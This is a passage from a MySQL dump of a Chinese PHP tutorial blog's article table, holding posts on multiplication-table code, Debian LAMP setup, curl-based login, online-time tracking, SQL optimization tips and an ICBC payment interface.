/&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$flag = false;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;break;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if($flag)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$temp[$i] = $i;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return $temp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\nPHP输出乘法表-递归 代码示例&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;div class=&quot;code&quot;&gt;&lt;br /&gt;\r\n//PHP输出乘法表-递归&lt;br /&gt;\r\nfunction digui($a,$step)&lt;br /&gt;\r\n{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;if($a &amp;amp;gt; $step) return;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;if( !empty($a) &amp;amp;amp;&amp;amp;amp; !empty($step) )&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;for($i=1;$i&amp;amp;lt;=$a;$i++)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;echo $i.''*''.$a.''=''.$a*$i.&quot;\\t&quot;;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if($i == $a )&amp;nbsp;&amp;nbsp;echo ''&lt;br /&gt;\r\n'';&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$a = $a + 1;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;digui($a,$step);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\nPHP输出乘法表-循环 代码示例&lt;br /&gt;\r\n&lt;br /&gt;\r\n//PHP输出乘法表-循环&lt;br /&gt;\r\nfunction chengfa($a,$step)&lt;br /&gt;\r\n{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;if( !empty($a) &amp;amp;amp;&amp;amp;amp; !empty($step) )&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;for($i=$a;$i&amp;amp;lt;=$step;$i++)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;for($j=1;$j&amp;amp;lt;=$i;$j++)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;echo $j.''*''.$i.''=''.$i*$j.&quot;\\t&quot;;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if($i==$j) echo ''&lt;br /&gt;\r\n '';&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n}', 1, 1, 0, 0, 1303795444, 1, 'admin'),
(86, 1, '在Debian上安装Apache2+PHP5+MySQL5', '', '', '使用Debian确实是省心又省力，基本你只需要会用&lt;span class=&quot;command&quot;&gt;&lt;strong&gt;aptitude install&lt;/strong&gt;&lt;/span&gt;就可以了，其它的事情，Debian全帮你做好了。在Debian上安装Apache Web服务器以及PHP5和MySQL非常简单，只需要按照下面的步骤：  &lt;p&gt;安装Apache2:&lt;/p&gt;\r\n&lt;pre class=&quot;programlisting&quot;&gt;aptitude install apache2 &lt;/pre&gt;&lt;p&gt;    这件命令安装apache服务器，安装完成后，Apache服务器的配置文件在&lt;span class=&quot;bold&quot;&gt;&lt;strong&gt;/etc/apache2/&lt;/strong&gt;&lt;/span&gt;，缺省的web服务器根目录在&lt;span class=&quot;bold&quot;&gt;&lt;strong&gt;/var/www/&lt;/strong&gt;&lt;/span&gt;，安装完后，你在浏览器的地址栏输入&lt;span class=&quot;emphasis&quot;&gt;&lt;em&gt;http://localhost/&lt;/em&gt;&lt;/span&gt;，如果可以看到&lt;span class=&quot;bold&quot;&gt;&lt;strong&gt;It works!&lt;/strong&gt;&lt;/span&gt;这样的内容，那么你的web服务器已经运行起来了。  &lt;/p&gt;\r\n&lt;p&gt;    接下来安装PHP5和MySQL5、Curl(HTTP工具)、IMAP(邮件检查)、GD (编辑和创建图像)：  &lt;/p&gt;\r\n&lt;pre class=&quot;programlisting&quot;&gt;aptitude install libapache2-mod-php5 php5-curl php5-gd php5-imap php5-mcrypt php5-mysql php5-tidy &lt;/pre&gt;&lt;p&gt;    接下来安装MySQL5服务器和客户端：  &lt;/p&gt;\r\n&lt;pre class=&quot;programlisting&quot;&gt;aptitude install mysql-server mysql-client &lt;/pre&gt;&lt;p&gt;    MySQL的配置文件在&lt;span class=&quot;bold&quot;&gt;&lt;strong&gt;/etc/mysql/my.cnf&lt;/strong&gt;&lt;/span&gt;，在安装MySQL服务器的时候，会要求你输入root密码。  &lt;/p&gt;\r\n&lt;p&gt;    最后，安装PHPMyAdmin工具：  &lt;/p&gt;\r\n&lt;pre class=&quot;programlisting&quot;&gt;aptitude install phpmyadmin &lt;/pre&gt;&lt;p&gt;    PHPMyAdmin会自动配置Apache服务器，安装完后，可以直接输入&lt;span class=&quot;bold&quot;&gt;&lt;strong&gt;http://localhost/phpmyadmin/&lt;/strong&gt;&lt;/span&gt;来访问PHPMyAdMin。  &lt;/p&gt;\r\n&lt;p&gt;    我们可以查看一下PHP的信息，以确信PHP已经运行起来了：  &lt;/p&gt;\r\n&lt;p&gt;    使用编辑器输入以下内容，把它保存成&lt;span class=&quot;bold&quot;&gt;&lt;strong&gt;/var/www/phpinfo.php&lt;/strong&gt;&lt;/span&gt;：  &lt;/p&gt;\r\n&lt;pre class=&quot;programlisting&quot;&gt;&amp;lt;?php phpinfo(); ?&amp;gt; &lt;/pre&gt;&lt;p&gt;    然后在浏览器地址栏输入&lt;span class=&quot;bold&quot;&gt;&lt;strong&gt;http://localhost/phpinfo.php&lt;/strong&gt;&lt;/span&gt;，你就可以看到PHP有关的配置信息。  &lt;/p&gt;\r\n', 1, 1, 0, 0, 1303812035, 1, 'admin'),
(87, 1, 'php中使用curl模拟用户登录实例详解', '', '', 'php中使用curl模拟用户登录实例详解：&lt;br /&gt;\r\n要使用curl需要php开启curl模块。默认不支持。 &lt;br /&gt;\r\n函数语法：&lt;br /&gt;\r\nbool curl_setopt (int ch, string option, mixed value)&lt;br /&gt;\r\ncurl_setopt()函数将为一个CURL会话设置选项。option参数是你想要的设置，value是这个选项给定的值。&lt;br /&gt;\r\n下列选项的值将被作为长整形使用(在option参数中指定)：　&lt;br /&gt;\r\n*CURLOPT_INFILESIZE: 当你上传一个文件到远程站点，这个选项告诉PHP你上传文件的大小。&lt;br /&gt;\r\n*CURLOPT_VERBOSE: 如果你想CURL报告每一件意外的事情，设置这个选项为一个非零值。&lt;br /&gt;\r\n*CURLOPT_HEADER: 如果你想把一个头包含在输出中，设置这个选项为一个非零值。&lt;br /&gt;\r\n*CURLOPT_NOPROGRESS: 如果你不会PHP为CURL传输显示一个进程条，设置这个选项为一个非零值。&lt;br /&gt;\r\n注意：PHP自动设置这个选项为非零值，你应该仅仅为了调试的目的来改变这个选项。&lt;br /&gt;\r\n*CURLOPT_NOBODY: 如果你不想在输出中包含body部分，设置这个选项为一个非零值。&lt;br /&gt;\r\n*CURLOPT_FAILONERROR: 如果你想让PHP在发生错误(HTTP代码返回大于等于300)时，不显示，设置这个选项为一人非零值。默认行为是返回一个正常页，忽略代码。&lt;br /&gt;\r\n*CURLOPT_UPLOAD: 如果你想让PHP为上传做准备，设置这个选项为一个非零值。&lt;br /&gt;\r\n*CURLOPT_POST: 如果你想PHP去做一个正规的HTTP POST，设置这个选项为一个非零值。这个POST是普通的 application/x-www-from-urlencoded 类型，多数被HTML表单使用。&lt;br /&gt;\r\n*CURLOPT_FTPLISTONLY: 设置这个选项为非零值，PHP将列出FTP的目录名列表。&lt;br /&gt;\r\n*CURLOPT_FTPAPPEND: 设置这个选项为一个非零值，PHP将应用远程文件代替覆盖它。&lt;br /&gt;\r\n*CURLOPT_NETRC: 设置这个选项为一个非零值，PHP将在你的 ~./netrc 文件中查找你要建立连接的远程站点的用户名及密码。&lt;br /&gt;\r\n*CURLOPT_FOLLOWLOCATION: 设置这个选项为一个非零值(象 &quot;Location: &quot;)的头，服务器会把它当做HTTP头的一部分发送(注意这是递归的，PHP将发送形如 &quot;Location: &quot;的头)。&lt;br /&gt;\r\n*CURLOPT_PUT: 设置这个选项为一个非零值去用HTTP上传一个文件。要上传这个文件必须设置CURLOPT_INFILE和CURLOPT_INFILESIZE选项.&lt;br /&gt;\r\n*CURLOPT_MUTE: 设置这个选项为一个非零值，PHP对于CURL函数将完全沉默。&lt;br /&gt;\r\n*CURLOPT_TIMEOUT: 设置一个长整形数，作为最大延续多少秒。&lt;br /&gt;\r\n*CURLOPT_LOW_SPEED_LIMIT: 设置一个长整形数，控制传送多少字节。&lt;br /&gt;\r\n*CURLOPT_LOW_SPEED_TIME: 设置一个长整形数，控制多少秒传送CURLOPT_LOW_SPEED_LIMIT规定的字节数。&lt;br /&gt;\r\n*CURLOPT_RESUME_FROM: 传递一个包含字节偏移地址的长整形参数，(你想转移到的开始表单)。&lt;br /&gt;\r\n*CURLOPT_SSLVERSION: 传递一个包含SSL版本的长参数。默认PHP将被它自己努力的确定，在更多的安全中你必须手工设置。&lt;br /&gt;\r\n*CURLOPT_TIMECONDITION: 传递一个长参数，指定怎么处理CURLOPT_TIMEVALUE参数。你可以设置这个参数为TIMECOND_IFMODSINCE 或 TIMECOND_ISUNMODSINCE。这仅用于HTTP。&lt;br /&gt;\r\n*CURLOPT_TIMEVALUE: 传递一个从1970-1-1开始到现在的秒数。这个时间将被CURLOPT_TIMEVALUE选项作为指定值使用，或被默认TIMECOND_IFMODSINCE使用。&lt;br /&gt;\r\n下列选项的值将被作为字符串：　&lt;br /&gt;\r\n*CURLOPT_URL: 这是你想用PHP取回的URL地址。你也可以在用curl_init()函数初始化时设置这个选项。&lt;br /&gt;\r\n*CURLOPT_USERPWD: 传递一个形如[username]:[password]风格的字符串,作用PHP去连接。&lt;br /&gt;\r\n*CURLOPT_PROXYUSERPWD: 传递一个形如[username]:[password] 格式的字符串去连接HTTP代理。&lt;br /&gt;\r\n*CURLOPT_RANGE: 传递一个你想指定的范围。它应该是&quot;X-Y&quot;格式，X或Y是被除外的。HTTP传送同样支持几个间隔，用逗句来分隔(X-Y,N-M)。&lt;br /&gt;\r\n*CURLOPT_POSTFIELDS: 传递一个作为HTTP &quot;POST&quot;操作的所有数据的字符串。&lt;br /&gt;\r\n*CURLOPT_REFERER: 在HTTP请求中包含一个&quot;referer&quot;头的字符串。&lt;br /&gt;\r\n*CURLOPT_USERAGENT: 在HTTP请求中包含一个&quot;user-agent&quot;头的字符串。&lt;br /&gt;\r\n*CURLOPT_FTPPORT: 传递一个包含被ftp &quot;POST&quot;指令使用的IP地址。这个POST指令告诉远程服务器去连接我们指定的IP地址。 这个字符串可以是一个IP地址，一个主机名，一个网络界面名(在UNIX下)，或是''-''(使用系统默认IP地址)。&lt;br /&gt;\r\n*CURLOPT_COOKIE: 传递一个包含HTTP cookie的头连接。&lt;br /&gt;\r\n*CURLOPT_SSLCERT: 传递一个包含PEM格式证书的字符串。&lt;br /&gt;\r\n*CURLOPT_SSLCERTPASSWD: 传递一个包含使用CURLOPT_SSLCERT证书必需的密码。&lt;br /&gt;\r\n*CURLOPT_COOKIEFILE: 传递一个包含cookie数据的文件的名字的字符串。这个cookie文件可以是Netscape格式，或是堆存在文件中的HTTP风格的头。&lt;br /&gt;\r\n*CURLOPT_CUSTOMREQUEST: 当进行HTTP请求时，传递一个字符被GET或HEAD使用。为进行DELETE或其它操作是有益的，更Pass a string to be used instead of GET or HEAD when doing an HTTP request. This is useful for doing or another, more obscure, HTTP request.&lt;br /&gt;\r\n注意: 在确认你的服务器支持命令先不要去这样做。&lt;br /&gt;\r\n下列的选项要求一个文件描述(通过使用fopen()函数获得)：&lt;br /&gt;\r\n*CURLOPT_FILE: 这个文件将是你放置传送的输出文件，默认是STDOUT.&lt;br /&gt;\r\n*CURLOPT_INFILE: 这个文件是你传送过来的输入文件。&lt;br /&gt;\r\n*CURLOPT_WRITEHEADER: 这个文件写有你输出的头部分。&lt;br /&gt;\r\n*CURLOPT_STDERR: 这个文件写有错误而不是stderr。&lt;br /&gt;\r\n用来获取需要登录的页面的例子,当前做法是每次或许都登录一次,有需要的人再做改进了。&lt;br /&gt;\r\n实例:&amp;lt;?php&lt;br /&gt;\r\n$cookie_jar = tempnam(''./tmp'',''cookie'');&lt;br /&gt;\r\n$ch = curl_init();&lt;br /&gt;\r\ncurl_setopt($ch, CURLOPT_URL, ''http://www.QQView.com'');&lt;br /&gt;\r\ncurl_setopt($ch, CURLOPT_POST, 1);&lt;br /&gt;\r\n$request = ''email_address=&amp;amp;password=&amp;amp;action='';&lt;br /&gt;\r\ncurl_setopt($ch, CURLOPT_POSTFIELDS, $request);&lt;br /&gt;\r\n//把返回来的cookie信息保存在$cookie_jar文件中&lt;br /&gt;\r\ncurl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_jar);&lt;br /&gt;\r\n//设定返回的数据是否自动显示&lt;br /&gt;\r\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);&lt;br /&gt;\r\n//设定是否显示头信息&lt;br /&gt;\r\ncurl_setopt($ch, CURLOPT_HEADER, false);&lt;br /&gt;\r\n//设定是否输出页面内容&lt;br /&gt;\r\ncurl_setopt($ch, CURLOPT_NOBODY, false);&lt;br /&gt;\r\ncurl_exec($ch);&lt;br /&gt;\r\ncurl_close($ch);&lt;br /&gt;\r\n//get data after login&lt;br /&gt;\r\n$ch2 = curl_init();&lt;br /&gt;\r\ncurl_setopt($ch2, CURLOPT_URL, ''http://www.phpzixue.cn/'');&lt;br /&gt;\r\ncurl_setopt($ch2, CURLOPT_HEADER, false);&lt;br /&gt;\r\ncurl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);&lt;br /&gt;\r\ncurl_setopt($ch2, CURLOPT_COOKIEFILE, $cookie_jar);&lt;br /&gt;\r\n$orders = curl_exec($ch2);&lt;br /&gt;\r\necho ''&amp;lt;pre&amp;gt;'';&lt;br /&gt;\r\necho strip_tags($orders);&lt;br /&gt;\r\necho ''&amp;lt;/pre&amp;gt;'';&lt;br /&gt;\r\ncurl_close($ch2);&lt;br /&gt;\r\n?&amp;gt; ', 1, 1, 0, 0, 1303894988, 1, 'admin'),
(88, 1, 'php计算用户在线时长的几种方法', '', '', 'php计算用户在线时长的几种方法：&lt;br /&gt;\r\n下面是计算用户在线时长的几种常用的方法，根据不同情况可做相应的选择： &lt;br /&gt;\r\n首先介绍一下所涉及的数据表结构，四个字段： &lt;br /&gt;\r\nuid&amp;lt;int(10)&amp;gt; ：用户id &lt;br /&gt;\r\nsession_id&amp;lt;varchar(40)&amp;gt; ：用户登录后系统产生的session_id，PHP可是使用session_id()函数获取 &lt;br /&gt;\r\nlogin_time&amp;lt;int(10)&amp;gt; ：登录时间 &lt;br /&gt;\r\nlogout_time&amp;lt;int(10)&amp;gt; ：登出时间 &lt;br /&gt;\r\n1. 服务器设定一个定时轮询的脚本。这个方法是在服务器端写一个定时执行的脚本，比如5分钟执行一次，根据数据库中的记录来判断每个会话的session_id是否还存在于服务器上，如果存在就更新logout_time,不存在就跳过。这样也能比较准确的统计在线时间，不过缺点是需要有服务器的控制权，不然无法设定定时脚本，linux系统可以通过crontab实现，windows系统可以通过计划任务来完成。如果你只是买的虚拟主机，那么这个方法也同样不适合你。 &lt;br /&gt;\r\n2. 客户端定时发送请求到服务器端。实现方法是在用户登录后，将uid,session_id,login_time插入一条记录，然后在客户端js设定一个计时器，比如每10分钟向服务器端发送一个请求，以此来达到更新登出时间的目的，当然这个间隔时间设定的越短，数据可能会越准确，不过相应的系统的负载也会越高，这个可以根据实际情况设定一个合适的值。这种方法广泛应用于webgame上，因为webgame的几乎所有请求都是ajax请求，不用刷新页面，一旦刷新页面，这个计时器就失去了价值，这也是这个方法的局限性。 &lt;br /&gt;\r\n3. 在用户每次活动时更新一下登出时间。这样在用户不活动或者退出的时候，登出时间就自然而然的存在于数据库里了，这也是本文着重讨论的方案。下面给出实现方法。 &lt;br /&gt;\r\n首先，在用户登录成功后，记录下其uid,session_id,并将现在时间作为登陆时间，现在时间+600s作为登出时间，插入数据库。 &lt;br /&gt;\r\n&amp;lt;?php&lt;br /&gt;\r\n$uid = $_SESSION[''uid''] = $info[''id'']; &lt;br /&gt;\r\n$session_id = $_SESSION[''session_id''] = session_id(); &lt;br /&gt;\r\n$login_time = time(); &lt;br /&gt;\r\n$logout_time = time()+600; &lt;br /&gt;\r\n$sql = &quot;INSERT INTO member_login (uid,session_id,login_time,logout_time) values($uid,''$session_id'',$login_time,$logout_time)&quot;; &lt;br /&gt;\r\nmysql_query($sql); &lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n然后在用户每次活动，也就是每点击一个页面时，如果session存在也就是处于登录状态时，更新用户登出时间 &lt;br /&gt;\r\n&amp;lt;?php&lt;br /&gt;\r\nif($_SESSION[''uid'']){ &lt;br /&gt;\r\n$uid = $_SESSION[''uid'']; &lt;br /&gt;\r\n$session_id = $_SESSION[''session_id'']; &lt;br /&gt;\r\n$logout_time = time()+600; &lt;br /&gt;\r\n$sql = &quot;UPDATE member_login SET logout_time=$logout_time WHERE uid=$uid AND session_id=''$session_id''&quot;; &lt;br /&gt;\r\nmysql_query($sql); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n这种方法的优点是相对来说实现起来比较简单，能够适用于大多数的网站，没有额外的服务器需求，而且也可以比较准确的统计用户的在线时间。 &lt;br /&gt;\r\n缺点也很明显，增加了数据库的更新操作，增加了系统的负载，不过对于中小型网站来说应该不是问题。', 1, 1, 0, 0, 1303895024, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(89, 1, '用php处理百万级以上的数据提高查询速度的方法', '', '', '用php处理百万级以上的数据提高查询速度的方法：&lt;br /&gt;\r\n1.应尽量避免在 where 子句中使用!=或&amp;lt;&amp;gt;操作符，否则将引擎放弃使用索引而进行全表扫描。 &lt;br /&gt;\r\n2.对查询进行优化，应尽量避免全表扫描，首先应考虑在 where 及 order by 涉及的列上建立索引。 &lt;br /&gt;\r\n3.应尽量避免在 where 子句中对字段进行 null 值判断，否则将导致引擎放弃使用索引而进行全表扫描，如： &lt;br /&gt;\r\nselect id from t where num is null &lt;br /&gt;\r\n可以在num上设置默认值0，确保表中num列没有null值，然后这样查询： &lt;br /&gt;\r\nselect id from t where num=0 &lt;br /&gt;\r\n4.应尽量避免在 where 子句中使用 or 来连接条件，否则将导致引擎放弃使用索引而进行全表扫描，如： &lt;br /&gt;\r\nselect id from t where num=10 or num=20 &lt;br /&gt;\r\n可以这样查询： &lt;br /&gt;\r\nselect id from t where num=10 &lt;br /&gt;\r\nunion all &lt;br /&gt;\r\nselect id from t where num=20 &lt;br /&gt;\r\n5.下面的查询也将导致全表扫描： &lt;br /&gt;\r\nselect id from t where name like ''%abc%'' &lt;br /&gt;\r\n若要提高效率，可以考虑全文检索。&lt;br /&gt;\r\n6.in 和 not in 也要慎用，否则会导致全表扫描，如： &lt;br /&gt;\r\nselect id from t where num in(1,2,3) &lt;br /&gt;\r\n对于连续的数值，能用 between 就不要用 in 了： &lt;br /&gt;\r\nselect id from t where num between 1 and 3  &lt;br /&gt;\r\n7.如果在 where 子句中使用参数，也会导致全表扫描。因为SQL只有在运行时才会解析局部变量，但优化程序不能将访问计划的选择推迟到运行时；它必须在编译时进行选择。然而，如果在编译时建立访问计划，变量的值还是未知的，因而无法作为索引选择的输入项。如下面语句将进行全表扫描： &lt;br /&gt;\r\nselect id from t where num=@num &lt;br /&gt;\r\n可以改为强制查询使用索引： &lt;br /&gt;\r\nselect id from t with(index(索引名)) where num=@num &lt;br /&gt;\r\n8.应尽量避免在 where 子句中对字段进行表达式操作，这将导致引擎放弃使用索引而进行全表扫描。如： &lt;br /&gt;\r\nselect id from t where num/2=100 &lt;br /&gt;\r\n应改为: &lt;br /&gt;\r\nselect id from t where num=100*2 &lt;br /&gt;\r\n9.应尽量避免在where子句中对字段进行函数操作，这将导致引擎放弃使用索引而进行全表扫描。如： &lt;br /&gt;\r\nselect id from t where substring(name,1,3)=''abc''--name以abc开头的id &lt;br /&gt;\r\nselect id from t where datediff(day,createdate,''2005-11-30'')=0--''2005-11-30''生成的id &lt;br /&gt;\r\n应改为: &lt;br /&gt;\r\nselect id from t where name like ''abc%'' &lt;br /&gt;\r\nselect id from t where createdate&amp;gt;=''2005-11-30'' and createdate&amp;lt;''2005-12-1'' &lt;br /&gt;\r\n10.不要在 where 子句中的“=”左边进行函数、算术运算或其他表达式运算，否则系统将可能无法正确使用索引。 &lt;br /&gt;\r\n11.在使用索引字段作为条件时，如果该索引是复合索引，那么必须使用到该索引中的第一个字段作为条件时才能保证系统使用该索引，否则该索引将不会被使用，并且应尽可能的让字段顺序与索引顺序相一致。 &lt;br /&gt;\r\n12.不要写一些没有意义的查询，如需要生成一个空表结构： &lt;br /&gt;\r\nselect col1,col2 into #t from t where 1=0 &lt;br /&gt;\r\n这类代码不会返回任何结果集，但是会消耗系统资源的，应改成这样： &lt;br /&gt;\r\ncreate table #t(...) &lt;br /&gt;\r\n13.很多时候用 exists 代替 in 是一个好的选择： &lt;br /&gt;\r\nselect num from a where num in(select num from b) &lt;br /&gt;\r\n用下面的语句替换： &lt;br /&gt;\r\nselect num from a where exists(select 1 from b where num=a.num) &lt;br /&gt;\r\n14.并不是所有索引对查询都有效，SQL是根据表中数据来进行查询优化的，当索引列有大量数据重复时，SQL查询可能不会去利用索引，如一表中有字段sex，male、female几乎各一半，那么即使在sex上建了索引也对查询效率起不了作用。 &lt;br /&gt;\r\n15.索引并不是越多越好，索引固然可以提高相应的 select 的效率，但同时也降低了 insert 及 update 的效率，因为 insert 或 update 时有可能会重建索引，所以怎样建索引需要慎重考虑，视具体情况而定。一个表的索引数最好不要超过6个，若太多则应考虑一些不常使用到的列上建的索引是否有必要。 &lt;br /&gt;\r\n16.应尽可能的避免更新 clustered 索引数据列，因为 clustered 索引数据列的顺序就是表记录的物理存储顺序，一旦该列值改变将导致整个表记录的顺序的调整，会耗费相当大的资源。若应用系统需要频繁更新 clustered 索引数据列，那么需要考虑是否应将该索引建为 clustered 索引。 &lt;br /&gt;\r\n17.尽量使用数字型字段，若只含数值信息的字段尽量不要设计为字符型，这会降低查询和连接的性能，并会增加存储开销。这是因为引擎在处理查询和连接时会逐个比较字符串中每一个字符，而对于数字型而言只需要比较一次就够了。 &lt;br /&gt;\r\n18.尽可能的使用 varchar/nvarchar 代替 char/nchar ，因为首先变长字段存储空间小，可以节省存储空间，其次对于查询来说，在一个相对较小的字段内搜索效率显然要高些。 &lt;br /&gt;\r\n19.任何地方都不要使用 select * from t ，用具体的字段列表代替“*”，不要返回用不到的任何字段。 &lt;br /&gt;\r\n20.尽量使用表变量来代替临时表。如果表变量包含大量数据，请注意索引非常有限（只有主键索引）。 &lt;br /&gt;\r\n21.避免频繁创建和删除临时表，以减少系统表资源的消耗。 &lt;br /&gt;\r\n22.临时表并不是不可使用，适当地使用它们可以使某些例程更有效，例如，当需要重复引用大型表或常用表中的某个数据集时。但是，对于一次性事件，最好使用导出表。 &lt;br /&gt;\r\n23.在新建临时表时，如果一次性插入数据量很大，那么可以使用 select into 代替 create table，避免造成大量 log ，以提高速度；如果数据量不大，为了缓和系统表的资源，应先create table，然后insert。 &lt;br /&gt;\r\n24.如果使用到了临时表，在存储过程的最后务必将所有的临时表显式删除，先 truncate table ，然后 drop table ，这样可以避免系统表的较长时间锁定。 &lt;br /&gt;\r\n25.尽量避免使用游标，因为游标的效率较差，如果游标操作的数据超过1万行，那么就应该考虑改写。 &lt;br /&gt;\r\n26.使用基于游标的方法或临时表方法之前，应先寻找基于集的解决方案来解决问题，基于集的方法通常更有效。 &lt;br /&gt;\r\n27.与临时表一样，游标并不是不可使用。对小型数据集使用 FAST_FORWARD 游标通常要优于其他逐行处理方法，尤其是在必须引用几个表才能获得所需的数据时。在结果集中包括“合计”的例程通常要比使用游标执行的速度快。如果开发时间允许，基于游标的方法和基于集的方法都可以尝试一下，看哪一种方法的效果更好。 &lt;br /&gt;\r\n28.在所有的存储过程和触发器的开始处设置 SET NOCOUNT ON ，在结束时设置 SET NOCOUNT OFF 。无需在执行存储过程和触发器的每个语句后向客户端发送 DONE_IN_PROC 消息。 &lt;br /&gt;\r\n29.尽量避免向客户端返回大数据量，若数据量过大，应该考虑相应需求是否合理。 &lt;br /&gt;\r\n30.尽量避免大事务操作，提高系统并发能力。 		    				', 1, 1, 0, 0, 1303895115, 1, 'admin'),
(90, 1, 'php实现工商银行在线支付接口', '', '', 'php实现工商银行在线支付接口:&lt;br /&gt;\r\n    实现工商银行的在线支付功能,主要是根据工商银行提供的在线支付的接口，将订单中的数据以表单的形式提交到工行指定的网站中接口中，具体详细的参数设置可以参考工行提供的文档说明书和实现的实例程序。&lt;br /&gt;\r\n在实现与工商银行接口之前，首先要在工行提供的说明书中找到如下两个文件。&lt;br /&gt;\r\n1.开发api接口\\lib\\windows\\win32\\infosecapi.dll(windows xp系统使用的文件).&lt;br /&gt;\r\n2.开发api接口\\asp\\icbcebankutil.dll&lt;br /&gt;\r\n    将其复制到系统文件夹下的windows\\system32目录下，运行命令&quot;regsvr32 icbcebankutil.dll&quot;加载服务。&lt;br /&gt;\r\n通过php实现网站与工行接口交互的方法如下&lt;br /&gt;\r\n首先，通过com类中的init方法对订单签名数据和商城的公钥进行加密处理，并且将指定的数据以表单的形式提交到工行指定的页面，代码如下:&lt;br /&gt;\r\n$src=&quot;ICBC_PERBANK_B2C1.0.0.0&quot;.$infomer[&quot;merid&quot;].$infomer[&quot;meracct&quot;].$returnaddress.&quot;HS&quot;.$ddnumber.$amount.&quot;0010&quot;.$nowtime.&quot;0&quot;;  &lt;br /&gt;\r\n$com=new com(''ICBCEBANKUTIL.B2CUtil'');  &lt;br /&gt;\r\n$rc=$com-&amp;gt;init(&quot;c:\\WINDOWS\\user.crt&quot;,&quot;c:\\WINDOWS\\user.crt&quot;,&quot;c:\\WINDOWS\\user.key&quot;,&quot;11111111&quot;);  &lt;br /&gt;\r\n$ssrc=$com-&amp;gt;signC($src, strlen($src));      //订单签名数据  &lt;br /&gt;\r\n$rc=$com-&amp;gt;verifySignC($src,strlen($src), $ssrc, 